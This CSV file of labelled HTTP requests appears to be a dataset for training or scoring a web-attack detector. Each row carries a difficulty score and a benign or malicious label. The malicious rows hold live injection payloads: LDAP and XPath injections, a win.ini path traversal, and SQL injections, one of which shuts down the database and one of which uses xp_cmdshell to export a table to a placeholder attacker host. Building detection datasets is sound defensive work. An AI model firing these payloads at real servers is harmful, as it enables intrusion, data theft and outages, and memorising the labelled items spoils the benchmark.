attack_type,difficulty_bucket,difficulty_score,label,raw_request,request_id,request_len,sample_id,source_dataset,source_payload
,hard,-2.0,benign,"GET /ofLwh9CJeC/rp9Rw_oCiAn/dnnrmrhgesetaeEh3eu/TIiframenhavingnEG/0dtJQ_aauAt.p/txKIdC4tVltm3/eReEgu/7HuZd-mz/lwIr.uMW2.bin?jvnVl7w2IM4E=%3Brevalr1&se=atdf5wtAmnooleeu&cqeierpee=eeeezsr&d5TtTlisiqsg8gn=05ciebteav&ierSups7l6uOe=5598&w9ahs2immrp=eteritofplft&dbiTddn=vduesroooetwe&ltai1scfshc=%26i%24airB9%5D%3Fe%290sI&iot2ymemqg2te=ai HTTP/1.1
Host: 210.192.196.127
Connection: keep-alive
Accept: */*;q=0.7
Accept-Charset: koi8;q=0.3
Accept-Encoding: 
Accept-Language: *
Cache-Control: E='ng'
Client-ip: 207.179.57.163
Cookie: 0catxA=7]>;rautH=59740;rEe=Jhaving
Cookie2: $Version=""96""
Date: Sun, 11 Feb 07 14:28:52 CET
ETag: ""G97@SWhNAQ2vuI4I""
Expect: gcbr
From: iuIqi35@sebqclrtn.be
If-Modified-Since: Mon, 17 Oct 05 02:35:36 GMT
If-Unmodified-Since: Thu, 11 Feb 10 13:13:19 GMT
If-Match: *
If-None-Match: ""4akf37QJE@AE5_6""
If-Range: *
Max-Forwards: 7154
MIME-Version: 8.6
Pragma: zi=yoiAi1i
Proxy-Authorization: NTLM aWVyN3VzaG8wbmhjaGNhb214SW9uN2FldHMzTWl0c2RvYW4ya2lIcGQ=
Authorization: NTLM aHN0TTllZGVvdGdjODhhYXJvbnRiYnNzSHlFcGVjb2Nh
Range: 4774-
Referer: /nvtCst6b/thnhh.dll
TE: trailers,chunked,trailers
Trailer: Max-Forwards
User-Agent: Mozilla/8.8 (Windows; U; WinNT 2.4; re-wl; rv:4.7.8) Gecko/35969617
UA-CPU: PowerPC
UA-Disp: 666,3443,32
UA-OS: Windows 98
UA-Color: color32
UA-Pixels: 4663x150
Via: HTTP/7.5 www.aepnie.html, FTP/4.8 81.103.48.185, 7.5 203.119.106.210
Transfer-Encoding: tstpi1
Upgrade: onsjt/4.9
Warning: 577 www.soDnr.shtml ""epcbtilItta9ssLe"" 
X-Forwarded-For: 43.198.16.171
X-Serial-Number: 465640999525707
----: -----------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",19736,1674,xml_test-19736,ECML/PKDD2007,
,hard,-2.0,benign,"GET /XMBISR/sMMD5.php3? HTTP/1.1
Host: www.er8oe.de:80
Connection: keep-alive
Accept: */*;q=0.4
Accept-Charset: *;q=0.3
Accept-Encoding: *
Accept-Language: x6ncrspe-bLmrowa;q=0.9, hloeTr-ou;q=0.3, aex2-eT1;q=0.3
Cache-Control: no-store
Client-ip: 62.249.107.195
Cookie: 7boecuyren=69781;adwze4=EAsma]os;nyntehes0=rg-include
Cookie2: $Version=""358""
Date: Sat, 13 May 06 06:58:41 CET
ETag: W/""_p8uqbNU7hHAv59YcgZE""
Expect: snhsa=sroukt;UaSeee
From: l14gyjst@isddra.be
If-Modified-Since: Fri, 19 Aug 05 06:03:20 GMT
If-Unmodified-Since: Sat, 10 Jan 09 02:34:47 CET
If-Match: ""BCG7ZAKQUsBRnRmPBefE""
If-None-Match: ""2R@ZjCyGVPwyRMG""
If-Range: Fri, 17 Mar 06 18:13:32 UTC
Max-Forwards: 630
MIME-Version: 6.0
Pragma: no-cache
Proxy-Authorization: NTLM a1RjaG9ib2pudDZvdGpDUjRhYWl4cnBpZWVydGtlc3Uz
Authorization: NTLM cnllYW05Z3RycE50eXQzYlVhUHBSTnNzb3BwbmJyZGV0d255ZXRzZWdObnRzbDFy
Range: -955518,84-,42-
Referer: http://ileu2ta.com/leOrp/fEK9t.jpg
TE: chunked;q=0.1,deflate;q=0.2
Trailer: Accept-Encoding
User-Agent: Mozilla/8.9 (X11; U; Open BSD i386 7.3; sa-pa; rv:6.3.2) Gecko/87680210
UA-CPU: 68000
UA-Disp: 2989,0086,16
UA-OS: Windows 98
UA-Color: color32
UA-Pixels: 9204x020
Via: HTTP/0.8 www.ntglg.htm
Transfer-Encoding: compress
Upgrade: tre/5.6, eMW/5.6, erle/4.7
Warning: 319 www.seEeeme.shtml:62 ""entaH6oantt2mash"" 
X-Forwarded-For: 166.105.2.220
X-Serial-Number: 27260320301
----: ----------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",18969,1494,xml_test-18969,ECML/PKDD2007,
LDAP Injection,medium,3.5,malicious,"POST /rjY2A8.-cr1y3ZX/fsrtmE8tnebutmaoaz/m99WKTF/jBu-7U5L1G5rqk5/xtPE@c-Qhtb/eMWo0d_IdrzivCH6mMFK.jpg? HTTP/1.0
Content-Length: 113
Content-Language: dGl4ty,dxzOpms6
Content-Encoding: compress
Content-Type: application/x-www-form-urlencoded
Last-Modified: Mon, 09 Apr 07 01:01:44 GMT
Host: 81.230.179.135:80
Connection: ymbin
Accept: audio/basic, audio/x-wav
Accept-Charset: iso-8859-7
Accept-Encoding: *;q=0.0
Accept-Language: 3qpEOy-ahit;q=0.8, n-aycmhtNn;q=0.6, e-ii, dAvsdwWo-tmxnaohE, deicGynr-ur
Cache-Control: m1IT='iesrf'
Cookie2: $Version=""851""
Date: Sun, 12 Jul 09 10:35:52 CET
Expect: 8mpesG7
If-Modified-Since: Wed, 08 Dec 04 01:45:10 UTC
If-Unmodified-Since: Fri, 03 Jun 05 17:23:58 UTC
If-Match: *
If-None-Match: ""eS7uwhXzfnEMKQxMV8m""
Max-Forwards: 520
Authorization: Basic cnJpYjpuTTJnc0Jv
Referer: /neFifm/tefTa/npni/9ok6sv/iidirst.mdb
TE: trailers,trailers
User-Agent: szcBd- http://www.awSMeczh.ch
Via: FTP/5.1 137.160.212.178, FTP/2.2 www.a6taei3d.jpg
Transfer-Encoding: hEjcm; MeyrA=8sno
Upgrade: lnd/9.2, toL/2.4
----: ------------------------------------------------

OsREAWusrs7PFE=8wW&edctt='snetcatw&noszNlpuxelos1=5h)(&(objectClass=   t6o*)&9eRafsibrsjie6g=pCzk3q",37723,1219,xml_test-37723,ECML/PKDD2007,
XPath Injection,medium,4.0,malicious,"POST /sre12cinid/nmax4NG/7Yi0Mxowv1zTS/qxu.krd-2usrL4B0/d8818tEByrbDXo/easrlnl/iVyWGKb-vsSC/lW.sVkwP.rz-NMQ.cgi? HTTP/1.0
Content-Length: 202
Content-Language: hcetf9s
Content-Encoding: compress
Content-Location: http://gfhuej.fr/utlh/oeotere/naoa/aaEsh/rebhos1.dll
Content-MD5: bllrcmVSbDJvYWxlaDJpcw==
Content-Type: application/x-www-form-urlencoded
Expires: Mon, 29 Mar 10 10:09:36 CET
Last-Modified: Fri, 25 Jan 08 07:19:59 CET
Host: 178.169.196.75
Connection: close
Accept: image/jpeg
Accept-Charset: *;q=0.3
Accept-Encoding: 
Accept-Language: vecfNo-eefhits;q=0.5
Cache-Control: no-transform
Client-ip: 140.188.172.60
Cookie: ekciECSecopyDY=14955;srUleodueoo=55;tpSeenetcliG=ps';airaaocitpWtwn=twnse4;ntatGv=eWOcJ;JdivXVuRA=92921
Cookie2: $Version=""590""
Date: Fri, 26 Mar 04 12:31:51 CET
ETag: ""iRPx-vhsrn5IOB4F@6ra""
Expect: oiaydiik=Cesre;ani7=heeoad
From: i1istd@23tm.net
If-Modified-Since: Sat, 18 Feb 06 11:23:30 UTC
If-Unmodified-Since: Mon, 05 Jan 04 13:43:02 CET
If-Match: *
If-None-Match: *
If-Range: Sat, 01 Dec 07 01:52:26 GMT
Max-Forwards: 743
MIME-Version: 7.4
Pragma: no-cache
Proxy-Authorization: Basic bXNlczlyaDpudHNo
Authorization: Basic SXR2dTp1bkljZGE=
Range: 569156-2482
Referer: http://ipuf.gov/eTaHsh/s4ni0cnh/scedawsd/AtnY.tiff
TE: gzip,trailers,trailers
Trailer: Expect
User-Agent: aOodhfe/1.1
UA-Disp: 527,267,32
UA-Color: color8
UA-Pixels: 640x9904
Via: 5.2 96.130.108.219, 4.0 230.93.196.168:3142, fT9/2.1 www.tuyssr.htm
Transfer-Encoding: gzip
Upgrade: 4mtfwe/7.8, Nuhsbd/2.0, ozoe1/6.1, oePeo/8.5, ats/0.5
Warning: 956 www.8Oqk.shtml:3 ""dhfeiV6ltr"" 
X-Forwarded-For: 243.139.91.251
X-Serial-Number: 3185085450816900238
----: ----------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

N6O4T@L4Ha=uae3b&access_logHWp0aHfVlocationJQ=b-A-Nu2b&ScatUhO=yxil&S20M47=riae'    or  1<     bern/6aanr/atpgn/child::text()[position()=638]   or     'd0aoab2f' =  '",48695,1927,xml_test-48695,ECML/PKDD2007,
LDAP Injection,medium,,malicious,"POST /view HTTP/1.1
Host: app.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Connection: close

file=admin*)((|userpassword=*)&id=1078",,191,patt-ldap-injection-0078,PayloadsAllTheThings,admin*)((|userpassword=*)
,hard,-2.0,benign,"GET /iP1h_szecJh5aC9y/7winntPGQHbt/-img59/lashkl/yeiwfheti3roi/1n.dIPIbGU/t4E7/nmn51ettte/uimgwEL-I/dr6tigvn7rr.dll?FgNXY9MMIgW=715554&twedioTv4lrOyOu=mZgEuc6Os&rowuvalnffzw=th%5C5nlikea%40smUuhddaaccept+q HTTP/1.1
Host: 187.172.56.252
Connection: keep-alive
Accept: */*
Accept-Charset: iso-8859-6
Accept-Encoding: *
Accept-Language: 6tnsq9-orSgR7S, 31NO-En9tiiin;q=0.8, 7-4, e-eWyc0rxp, eIvan-pleli;q=0.4
Cache-Control: no-store
Client-ip: 134.114.129.144
Cookie: rbih=dne;ndnrdstpe=leor;rolm=1835812;J460CG=70dz a2tlZaeyQgz|t;hueoiRto=awkFQrJ
Cookie2: $Version=""91""
Date: Sun, 05 Aug 07 22:21:25 GMT
ETag: W/""Tz31ZF5nQCkgNnyc""
Expect: 100-continue
From: AjrbGa@6tEJsir.cz
If-Modified-Since: Sun, 15 Oct 06 06:28:23 UTC
If-Unmodified-Since: Tue, 28 Apr 09 10:38:07 CET
If-Match: *
If-None-Match: *
If-Range: ""IH2zKmZe27tcJFh7J5tM""
Max-Forwards: 9531
MIME-Version: 9.1
Pragma: heso='urot'
Proxy-Authorization: easre atnA=isiejuv
Authorization: NTLM ZW1xb3plcGJ2b3IyaW5wd25vY29hMWViaDBjbGFpNnd0YWJvOUo4dHZPc29YaWM=
Range: 91-168
Referer: http://xntask.com/IDE73haw/ui4altT/zirny/zncShe.conf
TE: chunked;q=0.4,trailers
Trailer: Accept-Language
User-Agent: Mozilla/3.9 (Windows; U; Win98 3.9; bz-ae; rv:8.0.1) Gecko/32845083
UA-CPU: MIPS
UA-Disp: 1899,114,32
UA-OS: Win9x
UA-Color: color16
UA-Pixels: 1988x830
Via: 7.9 www.Hwoeqns.css, HTTP/5.9 223.172.157.255:31956
Transfer-Encoding: compress
Upgrade: aon/3.5, vnn/6.0, TohiyS/5.0, sxhL/6.8
Warning: 556 www.oeriie.jpg:88588 ""wf9nr6Oa"" 
X-Forwarded-For: 156.12.70.0
X-Serial-Number: 47214022934711888870
----: ------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",13544,1670,xml_test-13544,ECML/PKDD2007,
SQLi,medium,3.0,malicious,"GET /NNCru4scatTwj78/koihlsxhwihg8u/tF-hPPj4GrIvfkpP/lscsIojgrbyhn/a0i/0xE/ogY1dy-XqnD@sahoSv-/zadsecac/iFCNDar/oK5/rthtotbn.pl?wyt6NeaaI=nD6q0rno+etc&snem5mifatnco=%2FE%28aam1+ErLdIvz&gt=1mbh&MlienseaO=ox5-oDWYl&2ep3=3945 HTTP/1.1
Host: 37.112.30.20
Connection: aiunea
Accept: application/x-tar, text/html;q=0.2, audio/basic;q=0.8
Accept-Charset: iso-8859-8;q=0.0, cp-932;q=0.4, windows-1251;q=0.0, x-mac-hebrew;q=0.7
Accept-Encoding: *;q=0.5
Accept-Language: *;q=0.4
Cache-Control: no-cache
Client-ip: 136.100.0.212
Cookie: rrhn3=hlel8NnnlheGi6;lierapah=9medocument;sJb8lGa9qu=1951;wEkwDsd20e=255854338;pas6=OR    'n0s'     LIKE    'Sim%';nwDhd7isobItn=syimsabte
Cookie2: $Version=""2""
Date: Mon, 09 Nov 09 24:59:44 UTC
ETag: W/""J_zX9NUn3DWK1nq""
Expect: 0r4vui=lsinnpa;beetllsd=y6tcn
From: 7jtnsEc@oHtbtu9a.biz
If-Modified-Since: Sun, 25 Jan 04 04:06:26 CET
If-Unmodified-Since: Tue, 13 Mar 07 05:21:13 GMT
If-Match: *
If-None-Match: ""20ue-k_r5CYWR@T""
If-Range: Thu, 05 Feb 09 04:28:25 GMT
Max-Forwards: 06
MIME-Version: 4.7
Pragma: no-cache
Proxy-Authorization: Digest realm
Authorization: Digest cnonce=""uzosd6""
Range: 1-,9-8
Referer: /4oreu/Dagr.tar.gz
TE: gzip;q=0.9
Trailer: Range
User-Agent: Mozilla/0.4 (Windows; U; Win98 2.4; 3p-in; rv:3.2.7) Gecko/42006260
UA-CPU: MIPS
UA-Disp: 8902,8291,16
UA-OS: Mac OS X
UA-Color: color16
UA-Pixels: 5654x046
Via: 1.9 www.eyib.js:36
Transfer-Encoding: gzip
Upgrade: hnebp/4.7, dlb/9.5, 3Rmd/1.9, ocalhm/1.7, ejae/1.4
Warning: 350 www.Sdw54r.shtml ""dtdtp7mtttrwP"" 
X-Forwarded-For: 0.5.238.60
X-Serial-Number: 99307036492325759306
----: --------------------------------------------------",41295,1674,xml_test-41295,ECML/PKDD2007,
Path Traversal,medium,4.0,malicious,"GET /error/\..\..\..\..\winnt\win.ini? HTTP/1.0
Host: www.nAettOnv.biz
Connection: keep-alive
Accept: text/xml
Accept-Charset: *
Accept-Encoding: *
Accept-Language: iyEihr-Taa7kahr;q=0.1, nyGeta-o77atN
Cache-Control: no-transform
Client-ip: 217.208.54.150
Cookie: 6fofT3ben=gqQo1;ea1smudacAs=rmOwTnha3dt 
Cookie2: $Version=""8""
Date: Mon, 03 Jul 06 09:35:35 GMT
ETag: W/""lZRSKosY.s45V9ZcHcP""
Expect: 100-continue
From: NT7ihoi@svOy.it
If-Modified-Since: Wed, 30 Nov 05 11:41:10 CET
If-Unmodified-Since: Mon, 20 Mar 06 13:02:50 GMT
If-Match: ""m7e8SWEORE3SARe6""
If-None-Match: ""gAja489I21QsH_zgF6bm""
If-Range: Sun, 11 Mar 07 04:04:23 CET
Max-Forwards: 80
MIME-Version: 2.7
Pragma: ly4z='pj'
Proxy-Authorization: Digest cnonce=""lEha""
Authorization: Digest nc=aC1a3Cc9
Range: 61-,599945-,96-
Referer: http://www.h8tee.uk/iSan3/tnsc.pl
TE: trailers
Trailer: Connection
User-Agent: Mozilla/2.4 (X11; U; Unix 0.2; 5i-Lc; rv:6.3.3) Gecko/44398517
UA-CPU: StrongARM
UA-Disp: 0628,6146,8
UA-OS: Win98
UA-Color: color8
UA-Pixels: 213x015
Via: 2.1 www.nmIjfen.jpg, 6.3 54.170.128.53
Transfer-Encoding: identity
Upgrade: ttpNf/8.4
Warning: 131 165.136.34.196 ""tchbajdsaa"" ""Fri, 12 Mar 10 18:52:44 CET""
X-Forwarded-For: 211.43.232.104
X-Serial-Number: 95535933478300
----: -----------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",45090,1369,xml_test-45090,ECML/PKDD2007,
,hard,-2.0,benign,"GET /roceosot9wrdyoydnil.shtml?caeoNsnn=eh9CTsom&Ig0F_YyC=nz&deeua2ecc=cxb&hcwhptftnlDz6r=paIltbey9nt&Ergvr3OS4=tRpR8re&othtlOBtoTwso=s0lRQbRoV&wrtbjh6aebab=9&tvhyit=e+ebEg&Itr6rlneltereee=hsupdate7e&dwdToaTin=cZAqsQ7aXUzu&ofsaM9ta4f=oqTY HTTP/1.1
Host: 158.134.232.105:14
Connection: close
Accept: */*;q=0.1
Accept-Charset: windows-1254;q=0.4, iso-8859-2, iso-8859-9;q=0.0, x-mac-icelandic;q=0.3
Accept-Encoding: *;q=0.6
Accept-Language: *
Cache-Control: max-age=7
Client-ip: 200.252.94.25
Cookie: inputDor2tmp=rxcn;an=eS3 3>syR;nso=eIlwe5tef;urasaHpmBssms=86094;ipaeuonri=72453
Cookie2: $Version=""695""
Date: Wed, 30 Mar 05 08:21:03 CET
ETag: W/""uqrlVultJdDyCTofYQ""
Expect: 100-continue
From: tnsjx@nvlaoadtiu.st
If-Modified-Since: Thu, 03 Jun 04 18:07:32 GMT
If-Unmodified-Since: Fri, 26 Dec 08 04:50:09 UTC
If-Match: *
If-None-Match: *
If-Range: ""bwVpI6qBTcPz7lyL""
Max-Forwards: 9283
MIME-Version: 1.9
Pragma: no-cache
Proxy-Authorization: NTLM ZU5ud090cmxzMWR0cmFhY2V0YWVsbm9pcHdlbGR0dHN0czJyMmJtbG5zbHQ=
Authorization: o6Tr hogeh2i=ilumdPB
Range: 845-,0-,-57
Referer: http://baie.net/dehsem/aebndcsr/te6fiaWc/thttm5n.htm
TE: chunked;q=0.8,trailers
Trailer: TE
User-Agent: Mozilla/5.5 (X11; U; Linux i386 5.0; ti-l8; rv:3.1.4) Gecko/19670089
UA-CPU: x86
UA-Disp: 580,584,8
UA-OS: Windows NT
UA-Color: color32
UA-Pixels: 0954x9922
Via: HTTP/7.0 www.alr0ye.jpg
Transfer-Encoding: gzip
Upgrade: meE/0.7
Warning: 125 www.knwtlae.shtml ""ad0et9kU3d4n6SuMdtN"" ""Thu, 30 Sep 04 09:26:08 GMT""
X-Forwarded-For: 75.214.139.60
X-Serial-Number: 63208652767395
----: ------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~",11808,1651,xml_test-11808,ECML/PKDD2007,
SQLi,medium,3.0,malicious,"GET /aCfmRx7wph-@obOs/iqaGTF7ehyX05ovY0/tNAuYAooQ57r0OSm.shtml?ehylNroR=8781723&WorXFb1nI=4&yHrceaWnomtnOe=siadt3utreeefct2R&erh=tth&eek1rrcsAtybqti=87231000&9smrn=erutn%3C&sIA9tg=7383282&ek13v=gystivuP%7Cc&zrl6idra=and+++++0%3C%3E%28select+count%28*%29+from++++lr+where++++tme%3C%3E%29&dmuhejsmsrdn=oNP&glcTj=edtsstyleeoAsfew+&ILw.Cm22t=oid+rnlm7stwH+&lAooihHhn=ro1 HTTP/1.1
Host: 215.164.126.82
Connection: s6hpfxks
Accept: text/html, audio/basic;q=0.6, audio/basic;q=0.3
Accept-Charset: windows-1258
Accept-Encoding: 
Accept-Language: oC-nah;q=0.2, j8e6i-nenjh, eho-eir;q=0.5
Cache-Control: only-if-cached
Client-ip: 237.97.207.139
Cookie: hMmihrnnHiimS=weaziugd9ol8uiie;f5nimdd3=o T;tlLxui=1JbQZOX0bwr6;shetae6rhErs=7804
Cookie2: $Version=""8""
Date: Tue, 18 Nov 08 04:23:04 GMT
ETag: ""tN-IZ4t1Xvz3PGGu4c""
Expect: Ee02n=ittst6sO;hlInLqdo=cld7
If-Modified-Since: Sun, 18 Dec 05 03:49:48 GMT
If-Unmodified-Since: Sun, 07 Aug 05 07:54:23 GMT
If-Match: *
If-None-Match: *
If-Range: ""iy7ShGIHE6lGl6h3s0DX""
Max-Forwards: 916
MIME-Version: 9.3
Authorization: oeifa renlcmT=aansato
Referer: /lis8mpp/dbaeTo/uSn320.jpeg
TE: deflate;q=0.1,trailers,trailers
Trailer: Cache-Control
User-Agent: aSAjVnU http://www.iihnwl.uk
UA-OS: Windows NT
UA-Color: color8
UA-Pixels: 3589x325
Via: HTTP/2.0 www.nwTt5Um.jpeg, 0.7 www.1tiIoj6A.css, 7.0 www.oiqi19.css
Upgrade: TyteS/4.7, iaa/1.6, irg/7.1, 8lsno/4.8, era/0.2
Warning: 574 57.17.46.185 ""veun9pelul""",42379,1467,xml_test-42379,ECML/PKDD2007,
SQLi,hard,0.5,malicious,"GET /lGUfjtiM/hieeresmrhdott/eNDa/elTrytI2brm/q5Hqconnectj/nSA1kFHZ5KKD/rL4vm@8JUxa41eW/nr/htnX9/jhcmwmxlBlm6oeu.jpeg?4VGV4C1xG=0tvf&fr5i0i=sadwu1&ivbscriptMQBGNK=1.a&ep8on1flzCae=aaMSIt_eGRvO&astzlni=MensszhNWinS&8ktbV=exec+xp_cmdshell+%27bcp+%22select+++++*++++from+++++dd3lshr%22+++++queryout+pwdump.exe++++-c+++++-Craw+++-Shackersip+++++-Usa+++-Ph8ck3r%27 HTTP/1.1
Host: 63.217.230.191:80
Connection: keep-alive
Accept: image/jpeg;q=0.2
Accept-Charset: iso-8859-8;q=0.0, hz-gb-2312;q=0.1, x-mac-hebrew;q=0.9
Accept-Encoding: 
Accept-Language: wuo-ex20e, eotdmg-thmRjep;q=0.0, dtqgsor-tped
Cache-Control: max-stale
Client-ip: 104.85.29.24
Cookie: hz=hzuoezu0;allEoP=elsah70nO3oownean;9OM5_fG=tFtwC_;Qxre4riajli=oB5.;aw8a=800412;oiokn1ebsnaAi0e=eEG
Cookie2: $Version=""3""
Date: Wed, 25 Jun 08 16:44:48 CET
ETag: W/""2aTlPu50dA@UKfxeZq""
If-Modified-Since: Wed, 12 Mar 08 05:51:48 GMT
If-Unmodified-Since: Wed, 30 Aug 06 10:03:04 GMT
If-Match: ""kKU@y4@a64U27TPTYa""
If-None-Match: *
If-Range: *
Max-Forwards: 07
Pragma: oz2s='ltryu'
Authorization: kknwh 9eoe8nl=fNaroe
Referer: http://Odhn.ch/ahtNhzef.aspx
User-Agent: n8nignnnry
UA-CPU: 68000
UA-Disp: 106,924,16
Via: 8.3 www.h0ahl.html, 1.5 7.15.158.106
Transfer-Encoding: io9f; twi4h=rem2lw
Warning: 894 www.t2teem.tiff:4 ""hItafp"" 
X-Forwarded-For: 155.33.177.149
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",41124,1386,xml_test-41124,ECML/PKDD2007,
SQLi,medium,3.0,malicious,"GET /irtiilabqtbooabj/rZqFR_hWz@vg/awxPhs6gHq/1lKpdFq/paiihiii/adleapntu6strtArt8/wheredocumenti0optmnwhereHiLKL/xhonhol8ua87/tPQ0ORUcHjxa/tarwrrHthceFeqsMft/bhp7h2i/5gmRlasgbS.jpg?anoGjeicqd=948127&hiulsuolbr2r5xi=2930&tfoetEbttlN=aheoth6cghaving&@1fQn=%27%3B+shutdown--&r1t=re%28autoexecOvnp+m&qglprt=080&mhfe6qb7=likec&i1ndoedre7=408151&aolbtgpt=obe+u3e HTTP/1.0
Host: 32.16.37.141
Connection: fhnee
Accept: image/jpeg;q=0.4, image/jpeg, application/x-tar
Accept-Charset: windows-1250, x-mac-arabic;q=0.1, iso-8859-2
Accept-Encoding: 
Accept-Language: *
Cache-Control: no-transform
Client-ip: 41.133.176.17
Cookie: nisd8enca=pcrl;yth3hn1maee=vre
Cookie2: $Version=""316""
Date: Sat, 24 Apr 04 10:47:49 GMT
ETag: ""H-wtGNRWTakDfVw7""
Expect: taus=aiyn
From: Iyirabt@mar7tEeeb7.de
If-Modified-Since: Mon, 24 Nov 08 05:30:00 GMT
If-Unmodified-Since: Tue, 13 Jan 04 06:18:48 GMT
If-Match: *
If-None-Match: ""vwge@FysRj3zYHz""
If-Range: Sat, 25 Sep 04 13:40:58 GMT
Max-Forwards: 389
MIME-Version: 0.8
Pragma: otniwcif='n7l'
Proxy-Authorization: Digest uri=http://Ih9gc.net/soss.txt
Authorization: Basic ZWE0aHo6cm44ZmllMXY=
Range: -221064
Referer: /4tocr/edtsaee/pr33qex/lnh7mo3.tar
TE: gzip,trailers,trailers
Trailer: Accept-Charset
User-Agent: Mozilla/1.3 (X11; U; Unix 2.6; lo-4e; rv:2.5.1) Gecko/81235409
UA-CPU: Sparc
UA-Disp: 4298,556,32
UA-OS: FreeBSD
UA-Color: color32
UA-Pixels: 8709x899
Via: 6ucKLt/1.7 www.betno.jpeg, FTP/6.9 219.111.145.75
Transfer-Encoding: gzip
Upgrade: tsem/9.8, icrMn/2.4
Warning: 119 141.109.167.27 ""sebrw"" 
X-Forwarded-For: 88.3.128.18
X-Serial-Number: 772384141
----: ----------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",41981,1723,xml_test-41981,ECML/PKDD2007,
,hard,-2.0,benign,"GET /ai58eTgorfSNachin/ssM/Nneietmtmwkwu.bin?jhZ0wTx=tvxbetween&kssdofn5pl=eyler&cbturpsnu=oX8RovIXj&selecthxDe8q0=389&jOOAl=905&paeatqYaotNv=8&ihl3uhsilalen=446483&ssbason7=82470061&onrsoG=nls7r8oaf HTTP/1.1
Host: 99.164.73.55
Connection: keep-alive
Accept: */*
Accept-Charset: *;q=0.4
Accept-Encoding: 
Accept-Language: *
Cache-Control: only-if-cached
Client-ip: 248.143.44.71
Cookie: nics49dopo9=]tmailo;1bMJqIjx=n1ZRy-;allhyzarEeab=t0pOLSNty@v@;BsCiio=y2u7ie
Cookie2: $Version=""35""
Date: Wed, 26 Jan 05 08:27:24 UTC
ETag: W/""QnmIEfl0nYkxYvxbp""
Expect: m1u7ind1
From: ba6a@Eruaatrodo.be
If-Modified-Since: Sat, 31 Jul 04 09:47:44 CET
If-Unmodified-Since: Mon, 09 Feb 04 05:18:00 UTC
If-Match: ""x4b1N2EzxfU86Yu6""
If-None-Match: *
If-Range: *
Max-Forwards: 2974
MIME-Version: 6.4
Pragma: iriRSti=2
Proxy-Authorization: Basic bm9yZzFyOm93c28=
Authorization: NTLM YWV0dXhTdGd5aHk5YWVlSmxjc21yc3Q4ZWR0YWRhZXNzeg==
Range: 9-,-76849,526527-658
Referer: /oDtds/e4As6e/srcleng4/8cng.dll
TE: gzip
Trailer: Date
User-Agent: Mozilla/1.2 (Machintosh; U; PPC 0.7; ah-nr; rv:8.6.1) Gecko/14635422
UA-CPU: MIPS
UA-Disp: 0510,736,32
UA-OS: Win95
UA-Color: color16
UA-Pixels: 9692x597
Via: 4.6 208.168.251.63, n7etr/1.8 38.232.146.200:57
Transfer-Encoding: gzip
Upgrade: tOa/0.8
Warning: 249 www.rjnEOio.gif ""iaol"" 
X-Forwarded-For: 229.243.216.50
X-Serial-Number: 5960932931614
----: -----------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",25538,1510,xml_test-25538,ECML/PKDD2007,
